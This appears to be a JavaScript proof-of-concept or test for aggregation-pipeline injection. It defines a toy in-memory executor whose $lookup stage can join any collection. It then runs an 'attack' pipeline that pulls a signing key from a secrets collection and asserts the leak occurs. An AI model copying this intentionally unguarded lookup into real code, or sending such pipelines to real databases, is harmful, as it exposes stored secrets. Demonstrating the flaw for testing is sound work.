const collections = {
  accounts: [{ _id: 1, username: "guest", displayName: "Guest" }],
  deploymentSecrets: [{ accountId: 1, value: "internal-signing-key" }],
};

function executePipeline(input, pipeline) {
  let rows = input.map((row) => ({ ...row }));
  for (const stage of pipeline) {
    if (stage.$lookup) {
      const foreign = collections[stage.$lookup.from] ?? [];
      rows = rows.map((row) => ({
        ...row,
        [stage.$lookup.as]: foreign.filter(
          (candidate) =>
            candidate[stage.$lookup.foreignField] ===
            row[stage.$lookup.localField],
        ),
      }));
    }
    if (stage.$project) {
      rows = rows.map((row) =>
        Object.fromEntries(
          Object.entries(stage.$project)
            .filter(([, include]) => include === 1)
            .map(([field]) => [field, row[field]]),
        ),
      );
    }
  }
  return rows;
}

const attack = [
  {
    $lookup: {
      from: "deploymentSecrets",
      localField: "_id",
      foreignField: "accountId",
      as: "secrets",
    },
  },
  { $project: { username: 1, secrets: 1 } },
];
const result = executePipeline(collections.accounts, attack);
if (result[0]?.secrets?.[0]?.value !== "internal-signing-key") {
  throw new Error("aggregate lookup injection not reproduced");
}
console.log("vulnerable aggregate pipeline exposed the signing key");
